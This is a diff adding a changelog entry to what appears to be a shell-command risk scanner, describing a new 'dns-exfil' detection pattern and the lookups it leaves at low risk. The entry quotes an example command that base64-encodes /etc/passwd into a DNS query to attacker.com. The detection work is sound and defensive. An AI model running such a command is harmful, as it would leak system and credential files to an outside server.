@@ -4,6 +4,26 @@
 
 (no entries — next release window)
 
+## [1.10.206] - 2026-05-03
+
+**`dns-exfil` (critical) catalog pattern.** Attackers encode
+exfil data as a DNS subdomain query (`dig $(cat /etc/passwd
+| base64).attacker.com`), so the DNS resolver carries the
+payload to the attacker-controlled DNS server. After the
+denoise step unwraps `$(...)`, the inner reader sits between
+the DNS verb and the domain — same shape regardless of
+quoting / encoding.
+
+### Added
+- **`PATTERN_CATALOG.critical`** entry `dns-exfil`. Catches
+  `dig` / `host` / `nslookup` / `drill` with command-
+  substituted query containing
+  `cat`/`base64`/`hexdump`/`xxd`/`whoami`/`hostname`/
+  `id`/`uname` followed by a domain. Plain DNS lookups
+  (`dig example.com`, `nslookup 1.1.1.1`,
+  `dig @8.8.8.8 google.com`) and cross-statement
+  (`cat ...; dig google.com`) stay LOW.
+
 ## [1.10.205] - 2026-05-03
 
 **Backfill unit tests for v1.10.193-204 catalog rules.**
